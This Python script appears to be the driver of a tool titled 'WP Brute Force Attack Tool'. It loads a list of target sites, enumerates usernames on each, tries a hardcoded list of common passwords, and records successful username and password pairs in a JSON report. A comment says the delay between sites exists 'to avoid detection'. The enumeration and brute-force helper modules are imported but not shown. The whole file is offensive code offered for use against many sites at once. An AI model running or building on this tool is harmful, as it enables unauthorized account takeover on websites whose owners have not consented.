import time
import json
from modules.user_enum import enumerate_usernames
from modules.brute_force import brute_force_login
from modules.alive_checker import is_site_alive
from colorama import Fore, init

init(autoreset=True)

# Common passwords list
passwords = [
    "123456", "admin", "12345678", "qwerty", "password",
    "123456789", "12345", "123123", "letmein", "admin123"
]

def load_sites(filename="sites_list.txt"):
    try:
        with open(filename, "r") as f:
            return list(set([line.strip().rstrip("/") for line in f if line.strip()]))
    except:
        print("[!] Could not load sites.")
        return []

def save_report(results, filename="brute_force_report.json"):
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)
    print(Fore.GREEN + f"[✓] Results saved to {filename}")

def brute_force_all_sites():
    sites = load_sites()
    if not sites:
        print("[!] No sites to scan.")
        return

    results = []
    
    for site in sites:
        print(Fore.CYAN + f"\n[+] Checking site: {site}")
        if not is_site_alive(site):
            print(Fore.RED + "[-] Site not alive. Skipping.")
            continue

        usernames = enumerate_usernames(site)
        if not usernames:
            print(Fore.YELLOW + "[!] No usernames found.")
            continue

        print(Fore.BLUE + f"[~] Usernames found: {', '.join(usernames)}")
        
        user, pwd = brute_force_login(site, usernames, passwords, verbose=True)
        if user:
            result = {"site": site, "user": user, "password": pwd, "status": "success"}
            results.append(result)
            print(Fore.GREEN + f"[💥] Brute-force success: {user}:{pwd}")
        else:
            result = {"site": site, "status": "failed"}
            results.append(result)
            print(Fore.LIGHTBLACK_EX + "[x] Brute-force failed.")

        time.sleep(1)  # delay between sites to avoid detection

    # Save results to .json
    save_report(results)

if __name__ == "__main__":
    print(Fore.MAGENTA + "★ WP Brute Force Attack Tool ★\n")
    brute_force_all_sites()
